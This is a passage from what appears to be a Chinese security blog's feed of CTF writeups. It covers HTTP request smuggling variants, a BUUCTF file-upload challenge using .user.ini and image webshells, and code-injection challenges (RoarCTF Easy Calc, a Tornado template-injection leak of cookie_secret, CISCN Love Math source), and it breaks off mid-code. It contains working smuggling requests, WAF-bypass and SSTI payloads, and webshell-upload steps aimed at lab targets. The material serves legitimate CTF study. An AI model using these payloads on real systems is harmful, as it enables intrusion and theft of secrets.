id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL-TE"></a>CL-TE</h3><p>CL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>请求头，而后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>请求头。</p><p><strong>chunk传输数据(size的值由16进制表示)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[chunk size][\r\n][chunk data][\r\n][chunk size][\r\n][chunk data][\r\n][chunk size &#x3D; 0][\r\n][\r\n]</span><br></pre></td></tr></table></figure><p><strong>chunked编码</strong><br>参考：<a href="https://blog.csdn.net/yankai0219/article/details/8269922">http协议中content-length 以及chunked编码分析</a><br><strong>构造请求示例</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 6\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p>连续发送几次请求就可以获得响应。<br><strong>攻击流程</strong>：<br>由于前端服务器处理<code>Content-Length</code>，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">a</span><br></pre></td></tr></table></figure><p>当请求包经过代理服务器转发给后端服务器时，后端服务器处理<code>Transfer-Encoding</code>，当它读取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为已经读取到结尾了。<br>但剩下的字母<code>a</code>就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>服务器在解析时就会产生报错了，从而造成HTTP请求走私。</p><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE-CL"></a>TE-CL</h3><p>TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理<code>Transfer-Encoding</code>请求头，后端服务器处理<code>Content-Length</code>请求头。<br><strong>构造请求示例</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Content-Length</span>: 4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">12\r\n</span></span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为是读取完毕了。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理<code>Content-Length</code>请求头，因为请求体的长度为<code>4</code>.也就是当它读取完</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12\r\n</span><br></pre></td></tr></table></figure><p>就认为这个请求已经结束了。后面的数据就认为是另一个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p><h3 id="TE-TE"><a href="#TE-TE" class="headerlink" title="TE-TE"></a>TE-TE</h3><p>TE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理<code>Transfer-Encoding</code>请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的<code>Transfer-Encoding</code>进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理<code>Transfer-Encoding</code>请求头。在某种意义上这还是<code>CL-TE</code>或者<code>TE-CL</code>。<br><strong>构造请求示例</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Content-length</span>: 4\r\n</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked\r\n</span><br><span class="line"><span class="attribute">Transfer-encoding</span>: cow\r\n</span><br><span class="line">\r\n</span><br><span class="line"><span class="attribute">5c\r\n</span></span><br><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br>前端服务器处理<code>Transfer-Encoding</code>，当其读取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>认为是读取结束。<br>此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理<code>Transfer-encoding</code>请求头，将<code>Transfer-Encoding</code>隐藏在服务端的一个<code>chain</code>中时，它将会回退到使用<code>Content-Length</code>去发送请求。读取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c\r\n</span><br></pre></td></tr></table></figure><p>认为是读取完毕了。后面的数据就认为是另一个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aPOST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 15\r\n</span><br><span class="line">\r\n</span><br><span class="line">x=1\r\n</span><br><span class="line"><span class="attribute">0\r\n</span></span><br><span class="line"><span class="attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>参见嘶吼ctf easy calc:<a href="https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc">https://www.moonback.xyz/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/#RoarCTF-2019-Easy-Calc</a></p><p>参考：</p><p><a href="https://xz.aliyun.com/t/6654#toc-4">https://xz.aliyun.com/t/6654#toc-4</a></p><p><a href="https://paper.seebug.org/1048/#31-cl0get">https://paper.seebug.org/1048/#31-cl0get</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> http走私 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题-文件上传篇</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了BUUCTF上web题中文件上传部分的writeup，持续更新中！</p><a id="more"></a><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>本题主要考察了对<code>.user.ini</code>的使用</p><p>问题来了，什么是<code>.user.ini</code>？</p><p>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/2014103002272568560.png"></p><p>在模式为PHP_INI_USER的配置项提到了.user.ini，那么这是个什么配置文件？</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009201030.png"></p><p>php配置项中有两个比较有意思的项（下图第一、四个）：</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/2014103002272554789.png"></p><p><code>auto_append_file</code>、<code>auto_prepend_file</code>这两个配置是什么意思呢？</p><p><code>auto_prepend_file</code>的意思是指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了<code>require()</code>函数。而<code>auto_append_file</code>类似，只是在文件后面包含。 使用方法很简单，直接写在<code>.user.ini</code>中：</p><pre><code>auto_prepend_file=01.gif</code></pre><p>这样的活在访问同目录下的.php后缀的文件时就会把01.gif包含进去</p><p>所以，<code>.user.ini</code>的利用条件如下：</p><ol><li>服务器脚本语言为PHP</li><li>服务器使用<code>CGI／FastCGI</code>模式</li><li>上传目录下要有可执行的php文件</li></ol><p>废话少说，开始解题！</p><p>首先先上传一个<code>.user.ini</code>文件</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009203302.png"></p><p>再上传一个图片马，为了测试先写个<code>phpinfo()</code></p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009203927.png"></p><p>访问目录下的index.php，成功返回</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009204831.png"></p><p>上传一句话，蚁剑连，发现根目录<code>/flag</code>，成功解题</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/20191009205138.png"></p><p>BUUCTF上有源码,分析一波</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">&quot;uploads/&quot;</span> . md5($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/ph|htacess/i&quot;</span>, $extension)) &#123;        <span class="comment">//黑名单，对ph和htacess忽略大小写过滤</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">FALSE</span>) &#123;        <span class="comment">//读取文件，过滤<span class="meta">&lt;?</span>,用&lt;script language=&#x27;php&#x27;&gt;&lt;script/&gt;绕过</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);        <span class="comment">//文件头检测，加GIF89a绕过</span></span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>查看源码发现可以上传，将鼠标移到中间就可以上传了</p><p>前端有js检验，直接上传图片马改后缀名，上传php可以大小写，但不能成功解析，php3,php5也不能解析</p><p>最后发现phtml可以解析，getshell后在上传上层目录发现<code>.htaccess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch \.phtml$&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> web </tag>
            
            <tag> buuctf </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf刷题-代码命令注入篇</title>
      <link href="2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
      <url>2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了buuctf上web部分代码注入和命令执行相关题目的writeup！持续更新中！</p><a id="more"></a><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>打开查看源码发现是通过GET请求<code>calc.php</code>来获取答案的，直接访问能看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>先介绍一下PHP的字符串解析特性，PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符 </li><li>将某些字符转换为下划线（包括空格）</li></ol><p>以这题为例，我们可以用类似下面的payload来绕过waf，waf在哪？我也不知道，刚开始我以为是用php写的waf，找了好久没找到，后来看大佬们的博客才发现并不是</p><p>waf可能不允许传递传递的num参数的值有字母，我们就可以用<code>%20num</code>来传递，这样waf那边解析的就是<code>%20num</code>这个参数，而在php那里解析的就是<code>num</code>这个参数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%<span class="number">20</span>num=</span><br></pre></td></tr></table></figure><p>所以我们可以找一下flag文件位置，查看flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%<span class="number">20</span>num=var_dump(scandir(chr(<span class="number">47</span>)))<span class="comment">#查看flag位置</span></span><br><span class="line">    </span><br><span class="line">calc.php?%<span class="number">20</span>num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))<span class="comment">#读flag</span></span><br></pre></td></tr></table></figure><p>我们还可以利用无参数函数来构造payload</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200117001353.png" style="zoom:80%;"><p>还可以用http走私来构造，具体参见：<a href="https://www.moonback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/[](https://www.moonback.xyz/2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/)">https://www.moonback.xyz/2020/01/17/http走私学习/[](https://www.moonback.xyz/2020/01/17/http走私学习/)</a></p><p>我们就可以构造这种，在请求头里加上下面内容，并加上几个回车</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200120221923.png" style="zoom:67%;"><p>参考：</p><p><a href="http://62.234.60.226/2019/10/19/RoarCTF-wp.html">http://62.234.60.226/2019/10/19/RoarCTF-wp.html</a></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>打开题目发现三个文件，<code>flag.txt</code>提示flag在<code>/fllllllllllllag</code>，<code>welcome.txt</code>提示<code>render</code>，<code>hints.txt</code>提示<code>md5(cookie_secret+md5(filename))</code>，结合题目名字，联想到python中的tornado框架render模板注入</p><p>cookie_secret存放在handler.settings中，因此我们可以读取出cookie_secret，payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200213122111.png" style="zoom:80%;"><p>发现成功读取到cookie_secret，按照提示给的格式读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cookie_secret=<span class="string">&#x27;a33e0b4f-63b4-4ede-90b5-cc7bb45f48ca&#x27;</span>;</span><br><span class="line">$filename=<span class="string">&#x27;/fllllllllllllag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> md5($cookie_secret.md5($filename));</span><br></pre></td></tr></table></figure><p>尝试访问，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;8089e3218f80b4c12a208cc0e9974d98</span><br></pre></td></tr></table></figure><h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span 